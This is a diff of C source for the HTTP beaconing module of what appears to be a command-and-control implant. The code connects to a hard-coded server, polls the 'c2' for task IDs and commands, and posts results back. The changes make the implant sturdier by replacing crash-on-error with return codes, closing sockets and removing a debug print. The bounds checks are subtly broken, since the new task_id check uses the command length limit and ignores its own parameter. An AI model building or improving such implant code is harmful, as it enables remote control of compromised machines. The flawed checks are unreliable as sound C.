@@ -15,11 +15,6 @@
 
 static int current_sockfd = -1; //SOCKET
 
-void error_exit(char* msg) {
-    perror("msg");
-    exit(EXIT_FAILURE);
-}
-
 //if return 0 - success
 static int http_init(void) {
     current_sockfd = socket(AF_INET, SOCK_STREAM, 0);
@@ -34,6 +29,7 @@ static int http_init(void) {
     inet_pton(AF_INET, SERVER_IP, &addr_server.sin_addr);
 
     if(connect(current_sockfd, (struct sockaddr*)&addr_server, sizeof(addr_server)) == -1) {
+        close(current_sockfd);
         return 1;
     }
 
@@ -46,7 +42,7 @@ static int http_init(void) {
 
 //if return 0 - success
 //command, task_id - выходные аргументы
-static int http_get_command(char* command, char* task_id,  size_t max_len_command, char* agent_id) {
+static int http_get_command(char* command, char* task_id, size_t max_len_command, size_t max_len_task_id, char* agent_id) {
     char buf[2048] = {0};
     snprintf(buf, 
             sizeof(buf),
@@ -56,12 +52,12 @@ static int http_get_command(char* command, char* task_id,  size_t max_len_comman
             agent_id);
 
     if(send(current_sockfd, buf, sizeof(buf), 0) == -1) {
-        error_exit("send/HTTP");
+        return 1;
     }
 
     int count_bytes = read(current_sockfd, buf, sizeof(buf) - 1);
     if(count_bytes == -1) {
-        error_exit("read/HTTP");
+        return 1;
     }
 
     //for reliability
@@ -77,7 +73,7 @@ static int http_get_command(char* command, char* task_id,  size_t max_len_comman
         body++;
     }
     if(body[0] == 't' && body[1] == 'a' && body[2] == 's' && body[3] == 'k' && body[4] == '_' && body[5] == 'i' && body[6] == 'd' && body[7] == '\"') {
-        body += 9; 
+        body += 9;
         if(body[0] == 'n' && body[1] == 'u' && body[2] == 'l' && body[3] == 'l') {
             printf("[+/HTTP] No tasks for working.\n");
             fflush(stdout);
@@ -95,8 +91,8 @@ static int http_get_command(char* command, char* task_id,  size_t max_len_comman
         return 1;
     }
 
-    if(strlen(body) >= max_len_command) {
-        error_exit("command_len/HTTP");
+    if(strlen(body) >= max_len_command || strlen(task_id) >= max_len_command) {
+        return 1;
     }
     strncpy(task_id, body, strlen(body));
 
@@ -115,8 +111,6 @@ static int http_get_command(char* command, char* task_id,  size_t max_len_comman
     }
 
     strncpy(command, body, strlen(body));
-
-    printf("[HTTP] Получено: %s, %s", task_id, command);
 
     printf("[+/HTTP] Command fetch from c2 success.\n");
     fflush(stdout);
@@ -169,7 +163,7 @@ static int http_send_result(char* task_id, char* result) {
             body);
    
     if(send(current_sockfd, request, strlen(request), 0) == -1) {
-        error_exit("send/HTTP");
+        return 1;
     }
 
     printf("[+/HTTP] Send result to c2 success.\n");
